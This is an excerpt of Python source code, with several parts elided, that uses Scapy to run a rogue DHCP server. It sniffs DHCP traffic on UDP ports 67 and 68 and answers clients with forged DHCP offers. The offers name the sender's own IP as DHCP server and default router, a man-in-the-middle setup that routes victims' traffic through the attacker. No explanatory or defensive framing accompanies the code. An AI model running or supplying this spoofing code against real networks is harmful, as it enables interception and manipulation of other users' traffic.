...
def run_spoofing(values):
    ...
    def make_dhcp_offer_packet(raw_mac, xid):
        packet = (Ether(src=values.get("source_mac_address"), dst='ff:ff:ff:ff:ff:ff') /
                ...
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=values.get("source_ip"), xid=xid) /
                DHCP(options=[("message-type", "offer"),
                                ('server_id', values.get("source_ip")),
                                ('subnet_mask', '255.255.255.0'),
                                ('router', values.get("source_ip")),
                                ('lease_time', 192800),
                                ('renewal_time', 186400),
...
def spoofing(values):
    ...
    sniff(iface=values.get("iface"), filter="udp and (port 67 or 68)", prn=run_spoofing(values))
